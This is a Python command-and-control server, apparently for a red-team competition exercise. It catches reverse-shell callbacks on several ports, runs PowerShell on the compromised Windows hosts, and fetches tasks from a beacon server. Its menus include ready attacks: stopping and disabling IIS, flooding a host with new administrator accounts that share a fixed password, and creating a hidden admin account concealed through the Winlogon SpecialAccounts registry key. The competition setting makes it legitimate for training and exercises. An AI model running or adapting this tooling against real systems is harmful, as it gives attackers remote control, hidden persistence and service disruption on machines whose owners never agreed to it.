import socket
import time
import random
import threading

PORTS = [80, 443, 8080, 3306, 4444, 5985, 8443]

NAME_POOLS = {
    "USA": [
        "james_brooks", "michael_reed", "david_lane", "robert_hayes",
        "william_ford", "thomas_grant", "charles_bell", "daniel_shaw",
        "matthew_cole", "andrew_ross", "ryan_price", "kevin_hunt",
        "brian_stone", "steven_wade", "paul_bishop", "mark_burns",
        "jason_marsh", "eric_norris", "scott_quinn", "jeffrey_page"
    ],
    "USSR": [
        "nikolai", "tikhnov", "dmitri_volkov", "kuIagin",
        "kozlov", "novikov", "lebedev", "gusav",
        "tikhanov", "zhakov", "brezhev", "zhkov",
        "nikitin", "tertiak", "kasatunov", "vasiIiev",
        "Iebedev", "Iarionov", "kulegin", "kulikov"
    ]
}

sessions = {}
sessions_lock = threading.Lock()

#####################
# Whackamole Funcs
#####################

import json, urllib, ssl

SERVER_URL="https://127.0.0.1:8000/"
AGENT_TYPE="darius_c2"
AUTH_TOKEN="abc_123"
AUTH_TOKEN_DEFAULT="abc_123"
AUTH_TOKEN_LOCK = threading.Lock()

# Allow connection to the server (uses a self signed cert)
CTX = ssl.create_default_context()
CTX.check_hostname = False
CTX.verify_mode = ssl.CERT_NONE

def print_debug(message):
    # Stub function for a more detailed logging functionally present in Andrew's main codebase that doesn't make sense to replicate here
    # For example, if you have a DEBUG flag set, then print to console/logfile.
    # Otherwise (full deploy for comp), suppress output.
    #print(message)
    pass

def send_message(agent_ip,endpoint,message="",oldStatus=True,newStatus=True,server_timeout=5):
    """
    Sends the specified data to the server.
    Handles the full process and attaching agent name/auth/system details.

    Args: endpoint(string,required),message(any),oldStatus/newStatus(bool)
    Returns: status(Bool)
    """
    global AUTH_TOKEN
    if not SERVER_URL:
        # Server comms are intentionally disabled (server_url is an empty string)
        # Maybe redirect to print_debug instead?
        return False, "no SERVER_URL value specified"

    try:
        url = SERVER_URL + endpoint

        # Prep payload
        # Note that not all of these are strictly needed for every endpoint. However, the server accepts extra data fields without complaint, 
        # they do not add appreciable data leakage or transmission size to the communication, and they greatly simplify the arguments and 
        # assembly logic of the payload, so we attach the same data to every communication.
        payload = {
            "name": f"agent_{agent_ip}",
            "hostname": "N/A", #systemInfo["hostname"],
            "ip": agent_ip, #systemInfo["ipadd"],
            "os": "N/A", #
            "executionUser": "N/A", #systemInfo["executionUser"],
            "executionAdmin": True, #systemInfo["executionAdmin"],
            "auth": AUTH_TOKEN,
            "agent_type": AGENT_TYPE,
            "oldStatus": oldStatus,
            "newStatus": newStatus,
            "message": message
        }

        # Prepare data as JSON for transmit
        data = json.dumps(payload).encode("utf-8")

        # Build request
        req = urllib.request.Request(
            url,
            data=data,
            headers={"Content-Type": "application/json"},
            method="POST" # literally every endpoint is standardized on POST for agent comms as it's needed to send AUTH and other items
        )

        # Send payload
        with urllib.request.urlopen(req, timeout=server_timeout, context=CTX) as response:
            if response.getcode() == 200:
                # Good result! Now parse and return the endpoint
                print_debug(f"send_message({url}): sent msg to server: [{oldStatus,newStatus,message}]")
                response_text = response.read().decode('utf-8')
                # All beacon endpoints provide a new AUTH value that should be read in memory to replace the configured one
                # This updated AUTH value is needed for every agent endpoint beyond the basic beacon
                if "agent/beacon" in endpoint:
                    if AUTH_TOKEN == AUTH_TOKEN_DEFAULT:
                        if response_text != AUTH_TOKEN:
                            with AUTH_TOKEN_LOCK:
                                AUTH_TOKEN = response_text
                            print_debug(f"send_message({url}): updating auth token value to new value from server {AUTH_TOKEN}")
                return True, response_text
            else:
                print_debug(f"send_message({url}): Server error: {response.getcode()}")

    # Error handling
    # Various requests errors - networking failure or 4xx/5xx code from server (out of scope for client-side error handling)
    except urllib.error.HTTPError as e:
        print_debug(f"[send_message({url}): HTTP error: {e.code} {e.reason}")
    except urllib.error.URLError as e:
        print_debug(f"send_message({url}): URL error: {e.reason}")
    except Exception as e:
        print_debug(f"send_message({url}): Beacon error: {e}")
    return False, ""

def pwnboard_agent(agent_ip):
    # Handles keepalives and tasking for a single agent for a single iteration. Should be ran threaded.
    # Only checks for a single command each iteration.
    status, response = send_message(agent_ip,"agent/beacon","keepalive")
    status, response = send_message(agent_ip,"agent/get_task")
    if status: # Check that communication was successful
        if response != "no pending tasks":
            # We have a task waiting! Let's decode it (see API spec document):
            data = json.loads(response)
            task_id = data.get('task_id')
            task_command = data.get('task')
            try:
                result = send_command(agent_ip, task_command)
            except Exception as E:
                # Always account for weird errors (or a simple timeout) when you least expect it!
                # Don't leave the server hanging:
                print_debug(f"subprocess exception: {E}")
                result = f"unexpected exception when trying to execute task: {str(E)[:100]}" # truncate in case it's really big
            finally:
                # Now, we'll send the result back to the server
                resultjson = json.dumps({"task_id": task_id, "result": result}, separators=(',', ':')) # specify separators to compact whitespace
                status, response = send_message(agent_ip,"agent/set_task_result",message=resultjson)

def pwnboard_loop():
    # Spawns keepalive/task threads
    while True:
        with sessions_lock:
            # Copy a list of tuples (ip, connection) so we can release the lock ASAP
            active_ips = list(sessions.keys())
        
        threads = []
        for ip in active_ips:
            # Create a dedicated thread for this specific agent's turn and run them simultaneously
            t = threading.Thread(target=pwnboard_agent, args=(ip,), daemon=True)
            t.start()
            threads.append(t)

        # wait for all agent threads to finish to avoid threat overload if one is hanging too much
        # for t in threads:
        #     t.join(timeout=10) # Wait up to 10 seconds per thread

        time.sleep(60) # wait for next iteration

#####################
# End Whackamole Funcs
##################### 

# sends a powershell command to the target box and returns the output
def send_command(ip, command):
    try:
        with sessions_lock:
            if ip not in sessions:
                return "[!] No active session"
            conn = sessions[ip]["conn"]

        conn.send((command + "\n").encode("utf-8"))
        #time.sleep(3)

        response = b""
        conn.settimeout(2)
        try:
            while True:
                chunk = conn.recv(8192)
                if not chunk: # Connection closed
                    remove_session(ip)
                    return "[!] Connection closed by peer."
                response += chunk
                # set a very short timeout for subsequent chunks. if no more data arrives in 0.5s, we can assume the command is done.
                conn.settimeout(0.5) 
        except socket.timeout:
            # this is expected when the remote side finishes sending output
            pass

        return response.decode("utf-8", errors="ignore")
    except (socket.error, BrokenPipeError, ConnectionResetError):
        # purge the dead session if there's a network error (such as the client disconnecting)
        remove_session(ip)
        return "[!] Connection lost. Session removed."
    except Exception as e:
        return f"[!] Send failed: {e}"

# registers a new incoming connection into the sessions dictionary, and replacing stale ones
def register_session(ip, conn, port):
    with sessions_lock:
        if ip in sessions:
            try:
                sessions[ip]["conn"].close()
            except Exception:
                pass
        sessions[ip] = {"conn": conn, "port": port, "team": guess_team(ip)}
    print(f"\n[+] New session: {ip} on port {port} (team: {guess_team(ip)})")
    print("    Type 'sessions' at any prompt to see all active connections.")
    status, response = send_message(ip,"agent/beacon","register")

# based on the IP subnet, automatically sets the session as either USA or USSR for name pool
def guess_team(ip):
    if ip.startswith("10.100.2."):
        return "USA"
    elif ip.startswith("10.100.3."):
        return "USSR"
    return "USA"  # default for testing

# removes a dead session from the session registry
def remove_session(ip):
    with sessions_lock:
        if ip in sessions:
            del sessions[ip]
            print(f"[-] Session dropped: {ip}")

# continuously accepts new connections on a given port and registers them
def accept_loop(server, port):
    while True:
        try:
            conn, addr = server.accept()
            ip = addr[0]
            register_session(ip, conn, port)
        except Exception:
            break

# spins up one listener thread per port so all ports are monitored simultaneously
def start_listeners():
    for port in PORTS:
        try:
            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            server.bind(("0.0.0.0", port))
            server.listen(10)
            t = threading.Thread(target=accept_loop, args=(server, port), daemon=True)
            t.start()
            print(f"[*] Listener started on port {port}")
        except Exception as e:
            print(f"[!] Could not bind port {port}: {e}")

# builds the powershell command string to create a local user, optionally as admin
def make_user_command(username, admin=False):
    password = "Welcome1!"
    cmd = (
        f'New-LocalUser -Name "{username}" '
        f'-Password (ConvertTo-SecureString "{password}" -AsPlainText -Force) '
        f'-PasswordNeverExpires'
    )
    if admin:
        cmd += f'; Add-LocalGroupMember -Group "Administrators" -Member "{username}"'
    return cmd

# returns a shuffled copy of the name pool for the given team, restarts when exhausted
def get_name_queue(team):
    pool = NAME_POOLS.get(team, NAME_POOLS["USA"])[:]
    random.shuffle(pool)
    return pool

# drops a specified number of users onto the target box with an optional delay between each
def flood_users(ip, team, count, delay=0):
    queue = get_name_queue(team)
    used = []
    created = 0
    print(f"\n[*] Starting user drop — {count} users, {delay}s delay each\n")
    while created < count:
        if not queue:
            print("[*] Queue exhausted, reshuffling...")
            queue = [n for n in get_name_queue(team) if n not in used[-10:]]
        username = queue.pop(0)
        used.append(username)
        cmd = make_user_command(username, admin=True)
        print(f"[+] Creating ({created + 1}/{count}): {username}")
        result = send_command(ip, cmd)
        if result.strip():
            print(result)
        created += 1
        if delay > 0 and created < count:
            print(f"[*] Waiting {delay}s...")
            time.sleep(delay)
    print(f"\n[+] Done. {count} users created.")

# creates a single hidden admin user and buries it from the windows login screen via registry
def create_hidden_user(ip):
    username = "svc_diag"
    password = "Diag$2024!"
    cmd_create = (
        f'New-LocalUser -Name "{username}" '
        f'-Password (ConvertTo-SecureString "{password}" -AsPlainText -Force) '
        f'-PasswordNeverExpires'
    )
    cmd_admin = f'Add-LocalGroupMember -Group "Administrators" -Member "{username}"'
    cmd_hide  = (
        f'New-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\Windows NT'
        f'\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList" '
        f'-Name "{username}" -Value 0 -PropertyType DWord -Force'
    )
    print(f"\n[*] Creating hidden user: {username}")
    print(send_command(ip, cmd_create))
    print(send_command(ip, cmd_admin))
    print(send_command(ip, cmd_hide))
    print(f"[+] Hidden user '{username}' created | password: {password}")

# menu for selecting how to drop users onto the targe: instant flood, slow drip, or hidden
def user_flood_menu(ip, team):
    while True:
        print(f"\n--- User Flood Menu [{team}] ---")
        print("  [1] Drop 10 users instantly")
        print("  [2] Slow drip — 1 user every 5 min (up to 5)")
        print("  [3] Create 1 hidden admin user")
        print("  [0] Back")
        choice = input("Select> ").strip()
        if choice == "0":
            break
        elif choice == "1":
            flood_users(ip, team, count=10, delay=0)
        elif choice == "2":
            threading.Thread(
                target=flood_users,
                args=(ip, team, 5, 300),
                daemon=True
            ).start()
            print("[*] Slow drip running in background.")
        elif choice == "3":
            create_hidden_user(ip)

# menu for running pre-built attack automations against the selected session
def automation_menu(ip, team):
    automations = {
        "1": ("Disable IIS",       "Stop-Service -Name W3SVC; Set-Service -Name W3SVC -StartupType Disabled"),
        "2": ("Check IIS status",  "Get-Service -Name W3SVC | Select-Object Status"),
        "3": ("Whoami + hostname", "whoami; hostname"),
        "4": ("List local admins", "Get-LocalGroupMember -Group Administrators"),
        "5": ("User flood",        None),
    }
    while True:
        print(f"\n--- Automation Menu [{team}] ---")
        for key, (label, _) in automations.items():
            print(f"  [{key}] {label}")
        print("  [0] Back")
        choice = input("Select> ").strip()
        if choice == "0":
            break
        elif choice == "5":
            user_flood_menu(ip, team)
        elif choice in automations:
            label, cmd = automations[choice]
            print(f"\n[*] Running: {label}")
            print(send_command(ip, cmd))

# opens the interaction menu for a specific session selected by IP
def interactive_mode(ip):
    print(f"[*] Interactive shell on {ip}. Type 'back' to return.\n")
    while True:
        cmd = input(f"{ip}> ").strip()
        if cmd.lower() == "back":
            break
        if cmd:
            print(send_command(ip, cmd))

# opens the interaction menu for a specific session selected by an IP
def session_menu(ip):
    with sessions_lock:
        if ip not in sessions:
            print(f"[!] No active session for {ip}")
            return
        session = sessions[ip]
    team = session["team"]
    port = session["port"]

    while True:
        print(f"\n=== Session: {ip} | Team: {team} | Port: {port} ===")
        print("  [1] Interactive shell")
        print("  [2] Automations")
        print("  [3] Back to session list")
        choice = input("Select> ").strip()
        if choice == "1":
            interactive_mode(ip)
        elif choice == "2":
            automation_menu(ip, team)
        elif choice == "3":
            break

# prints all currently active sessions with their IP, port, and team
def print_sessions():
    with sessions_lock:
        if not sessions:
            print("\n[!] No active sessions.")
            return
        print("\n--- Active Sessions ---")
        for i, (ip, data) in enumerate(sessions.items(), 1):
            print(f"  [{i}] {ip:15s}  port: {data['port']}  team: {data['team']}")

# top-level menu for browsing and selecting active sessions to interact with
def sessions_menu():
    while True:
        print("\n======== C2 SESSIONS ========")
        print_sessions()
        print("\n  [i]  Interact with a session (enter IP)")
        print("  [r]  Refresh session list")
        print("  [q]  Quit")
        choice = input("\nC2> ").strip().lower()
        if choice == "q":
            print("[*] Exiting.")
            break
        elif choice == "r":
            continue
        elif choice == "i":
            ip = input("Enter target IP> ").strip()
            with sessions_lock:
                if ip not in sessions:
                    print(f"[!] No session for {ip}. Check IP or wait for callback.")
                    continue
            session_menu(ip)

def main():
    print("[*] Starting listeners...")
    start_listeners()
    print(f"[*] Listening on ports: {PORTS}")
    print("[*] Waiting for callbacks...\n")
    pwnboard_loop_thread = threading.Thread(target=pwnboard_loop, args=(), daemon=True)
    pwnboard_loop_thread.start()
    sessions_menu()

if __name__ == "__main__":
    main()